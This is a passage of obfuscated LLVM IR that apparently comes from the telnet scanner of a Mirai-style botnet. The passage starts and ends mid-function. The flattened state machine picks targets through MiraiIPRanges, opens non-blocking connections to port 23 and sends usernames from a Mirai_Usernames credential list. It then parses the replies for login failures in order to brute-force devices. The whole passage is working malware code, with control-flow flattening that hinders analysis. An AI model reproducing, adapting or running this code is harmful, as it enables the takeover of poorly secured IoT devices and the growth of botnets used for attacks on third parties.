  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %20, align 8
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %127
  %129 = bitcast %struct.telstate_t* %128 to i8*
  call void @llvm.memset.p0i8.i64(i8* %129, i8 0, i64 32, i32 16, i1 false)
  %130 = load i8*, i8** %20, align 8
  %131 = load i32, i32* %6, align 4
  %132 = sext i32 %131 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 9
  store i8* %130, i8** %134, align 8
  %135 = call i32 @MiraiIPRanges()
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 1
  store i32 %135, i32* %139, align 4
  store i32 -1133655181, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 3
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 -1111139045, i32 -214079669
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %6, align 4
  %151 = sext i32 %150 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 4
  %154 = load i8, i8* %153, align 2
  %155 = add i8 %154, 1
  store i8 %155, i8* %153, align 2
  %156 = load i32, i32* %6, align 4
  %157 = sext i32 %156 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 5
  %160 = load i8, i8* %159, align 1
  %161 = add i8 %160, 1
  store i8 %161, i8* %159, align 1
  %162 = load i32, i32* %6, align 4
  %163 = sext i32 %162 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 5
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i64
  %168 = icmp eq i64 %167, 1
  %169 = select i1 %168, i32 814972365, i32 -24582925
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i32, i32* %6, align 4
  %172 = sext i32 %171 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 3
  store i8 1, i8* %174, align 1
  store i32 -24582925, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i32, i32* %6, align 4
  %177 = sext i32 %176 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 4
  %180 = load i8, i8* %179, align 2
  %181 = zext i8 %180 to i64
  %182 = icmp eq i64 %181, 1
  %183 = select i1 %182, i32 1742640315, i32 1634593657
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 3
  store i8 1, i8* %188, align 1
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -214079669, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 -1133655181, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %192, align 4
  %193 = call zeroext i16 @htons(i16 zeroext 23) #10
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %196 = getelementptr inbounds [8 x i8], [8 x i8]* %195, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %196, i8 0, i64 8, i32 4, i1 false)
  %197 = load i32, i32* %6, align 4
  %198 = sext i32 %197 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %205 = load i32, i32* %6, align 4
  %206 = sext i32 %205 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  store i32 %204, i32* %208, align 16
  %209 = load i32, i32* %6, align 4
  %210 = sext i32 %209 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = icmp eq i32 %213, -1
  %215 = select i1 %214, i32 -1453679090, i32 -1337698265
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i32, i32* %6, align 4
  %219 = sext i32 %218 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 16
  %223 = load i32, i32* %6, align 4
  %224 = sext i32 %223 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = call i32 (i32, i32, ...) @fcntl(i32 %227, i32 3, i8* null)
  %229 = or i32 %228, 2048
  %230 = call i32 (i32, i32, ...) @fcntl(i32 %222, i32 4, i32 %229)
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 16
  %236 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %237 = call i32 @connect(i32 %235, %struct.sockaddr* %236, i32 16)
  %238 = icmp eq i32 %237, -1
  %239 = select i1 %238, i32 49000008, i32 1396586038
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32* @__errno_location() #10
  %242 = load i32, i32* %241, align 4
  %243 = icmp ne i32 %242, 115
  %244 = select i1 %243, i32 -1351288409, i32 1396586038
  store i32 %244, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i32, i32* %6, align 4
  %247 = sext i32 %246 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %247
  call void @reset_telstate(%struct.telstate_t* %248)
  store i32 -1031513874, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %6, align 4
  %251 = sext i32 %250 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %251
  call void @advance_telstate(%struct.telstate_t* %252, i32 1)
  store i32 -1031513874, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 173318586, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %256, i64 0, i64 0
  %258 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %257) #5, !srcloc !6
  %259 = extractvalue { i64, i64* } %258, 0
  %260 = extractvalue { i64, i64* } %258, 1
  %261 = trunc i64 %259 to i32
  store i32 %261, i32* %21, align 4
  %262 = ptrtoint i64* %260 to i64
  %263 = trunc i64 %262 to i32
  store i32 %263, i32* %22, align 4
  store i32 439945267, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  store i32 -1873697709, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i32, i32* %6, align 4
  %267 = sext i32 %266 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = srem i32 %270, 64
  %272 = zext i32 %271 to i64
  %273 = shl i64 1, %272
  %274 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = sdiv i32 %279, 64
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds [16 x i64], [16 x i64]* %274, i64 0, i64 %281
  %283 = load i64, i64* %282, align 8
  %284 = or i64 %283, %273
  store i64 %284, i64* %282, align 8
  %285 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %285, align 8
  %286 = load i32, i32* %3, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %287, i64* %288, align 8
  %289 = load i32, i32* %6, align 4
  %290 = sext i32 %289 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = add nsw i32 %293, 1
  %295 = call i32 @select(i32 %294, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %295, i32* %7, align 4
  %296 = load i32, i32* %7, align 4
  %297 = icmp eq i32 %296, 1
  %298 = select i1 %297, i32 1190823612, i32 -760613892
  store i32 %298, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = call i64 @time(i64* null) #5
  %301 = trunc i64 %300 to i32
  %302 = load i32, i32* %6, align 4
  %303 = sext i32 %302 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %303
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %304, i32 0, i32 7
  store i32 %301, i32* %305, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %306 = load i32, i32* %6, align 4
  %307 = sext i32 %306 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = bitcast i32* %15 to i8*
  %312 = call i32 @getsockopt(i32 %310, i32 1, i32 4, i8* %311, i32* %14) #5
  %313 = load i32, i32* %15, align 4
  %314 = icmp ne i32 %313, 0
  %315 = select i1 %314, i32 -2036439522, i32 154011159
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load i32, i32* %6, align 4
  %318 = sext i32 %317 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %318
  call void @reset_telstate(%struct.telstate_t* %319)
  store i32 -1276841184, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %6, align 4
  %322 = sext i32 %321 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = load i32, i32* %6, align 4
  %327 = sext i32 %326 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %328, i32 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = call i32 (i32, i32, ...) @fcntl(i32 %330, i32 3, i8* null)
  %332 = and i32 %331, -2049
  %333 = call i32 (i32, i32, ...) @fcntl(i32 %325, i32 4, i32 %332)
  %334 = load i32, i32* %6, align 4
  %335 = sext i32 %334 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %335
  call void @advance_telstate(%struct.telstate_t* %336, i32 2)
  store i32 -1276841184, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i32, i32* %7, align 4
  %340 = icmp eq i32 %339, -1
  %341 = select i1 %340, i32 -1495591006, i32 703132207
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i32, i32* %6, align 4
  %344 = sext i32 %343 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %344
  call void @reset_telstate(%struct.telstate_t* %345)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 1540402235, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i32, i32* %6, align 4
  %349 = sext i32 %348 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 7
  %352 = load i32, i32* %351, align 16
  %353 = add i32 %352, 7
  %354 = zext i32 %353 to i64
  %355 = call i64 @time(i64* null) #5
  %356 = icmp slt i64 %354, %355
  %357 = select i1 %356, i32 184210927, i32 -798300770
  store i32 %357, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i32, i32* %6, align 4
  %360 = sext i32 %359 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %360
  call void @reset_telstate(%struct.telstate_t* %361)
  store i32 -798300770, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i32, i32* %6, align 4
  %365 = sext i32 %364 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 0
  %368 = load i32, i32* %367, align 16
  %369 = load i32, i32* %3, align 4
  %370 = load i32, i32* %6, align 4
  %371 = sext i32 %370 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 9
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @read_until_response(i32 %368, i32 %369, i8* %374, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %376 = icmp ne i32 %375, 0
  %377 = select i1 %376, i32 -491226002, i32 1764691353
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = call i64 @time(i64* null) #5
  %380 = trunc i64 %379 to i32
  %381 = load i32, i32* %6, align 4
  %382 = sext i32 %381 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 7
  store i32 %380, i32* %384, align 16
  %385 = load i32, i32* %6, align 4
  %386 = sext i32 %385 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 9
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @contains_fail(i8* %389)
  %391 = icmp ne i32 %390, 0
  %392 = select i1 %391, i32 1535793691, i32 353183236
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i32, i32* %6, align 4
  %395 = sext i32 %394 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %395
  call void @advance_telstate(%struct.telstate_t* %396, i32 0)
  store i32 192599732, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i32, i32* %6, align 4
  %399 = sext i32 %398 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %399
  call void @advance_telstate(%struct.telstate_t* %400, i32 3)
  store i32 192599732, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i32, i32* %6, align 4
  %404 = sext i32 %403 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 7
  %407 = load i32, i32* %406, align 16
  %408 = add i32 %407, 7
  %409 = zext i32 %408 to i64
  %410 = call i64 @time(i64* null) #5
  %411 = icmp slt i64 %409, %410
  %412 = select i1 %411, i32 -345510521, i32 -807172634
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load i32, i32* %6, align 4
  %415 = sext i32 %414 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %415
  call void @reset_telstate(%struct.telstate_t* %416)
  store i32 -807172634, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:418:                                    ; preds = %loopEntry
  %419 = load i32, i32* %6, align 4
  %420 = sext i32 %419 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 16
  %424 = load i32, i32* %6, align 4
  %425 = sext i32 %424 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 4
  %428 = load i8, i8* %427, align 2
  %429 = zext i8 %428 to i64
  %430 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %429
  %431 = load i8*, i8** %430, align 8
  %432 = load i32, i32* %6, align 4
  %433 = sext i32 %432 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 4
  %436 = load i8, i8* %435, align 2
  %437 = zext i8 %436 to i64
  %438 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %437
  %439 = load i8*, i8** %438, align 8
  %440 = call i64 @strlen(i8* %439) #9
  %441 = call i64 @send(i32 %423, i8* %431, i64 %440, i32 16384)
  %442 = icmp slt i64 %441, 0
  %443 = select i1 %442, i32 877783109, i32 -993557533
  store i32 %443, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i32, i32* %6, align 4
  %446 = sext i32 %445 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %446
  call void @reset_telstate(%struct.telstate_t* %447)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i32, i32* %6, align 4
  %450 = sext i32 %449 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 16
  %454 = call i64 @send(i32 %453, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %455 = icmp slt i64 %454, 0
  %456 = select i1 %455, i32 1995327349, i32 1514699517
  store i32 %456, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = load i32, i32* %6, align 4
  %459 = sext i32 %458 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %459
  call void @reset_telstate(%struct.telstate_t* %460)
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:461:                                    ; preds = %loopEntry
  %462 = load i32, i32* %6, align 4
  %463 = sext i32 %462 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %463
  call void @advance_telstate(%struct.telstate_t* %464, i32 4)
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  %466 = load i32, i32* %6, align 4
  %467 = sext i32 %466 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = load i32, i32* %3, align 4
  %472 = load i32, i32* %6, align 4
  %473 = sext i32 %472 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 9
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 @read_until_response(i32 %470, i32 %471, i8* %476, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %478 = icmp ne i32 %477, 0
  %479 = select i1 %478, i32 -818325972, i32 -949553544
  store i32 %479, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = call i64 @time(i64* null) #5
  %482 = trunc i64 %481 to i32
  %483 = load i32, i32* %6, align 4
  %484 = sext i32 %483 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 7
  store i32 %482, i32* %486, align 16
  %487 = load i32, i32* %6, align 4
  %488 = sext i32 %487 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 9
  %491 = load i8*, i8** %490, align 8
  %492 = call i32 @contains_fail(i8* %491)
  %493 = icmp ne i32 %492, 0
  %494 = select i1 %493, i32 126921871, i32 -1846400418
  store i32 %494, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load i32, i32* %6, align 4
  %497 = sext i32 %496 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %497
  call void @advance_telstate(%struct.telstate_t* %498, i32 0)
  store i32 368652407, i32* %switchVar
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  %500 = load i32, i32* %6, align 4
  %501 = sext i32 %500 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %501
  call void @advance_telstate(%struct.telstate_t* %502, i32 5)
  store i32 368652407, i32* %switchVar
